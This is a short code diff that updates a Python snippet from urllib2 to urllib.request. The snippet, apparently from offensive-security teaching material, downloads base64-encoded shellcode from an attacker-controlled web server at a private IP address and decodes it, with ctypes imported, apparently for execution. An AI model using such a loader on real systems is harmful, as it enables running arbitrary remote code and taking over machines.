@@ -1,10 +1,10 @@
-import urllib2
+from urllib.request import urlopen
 import ctypes
 import base64
 
 # retrieve the shellcode from our web server
 url = "http://192.168.1.7:8100/shellcode.bin"
-response = urllib2.urlopen(url)
+response = urlopen(url)
 
 # decode the shellcode from base64 
 shellcode = base64.b64decode(response.read())
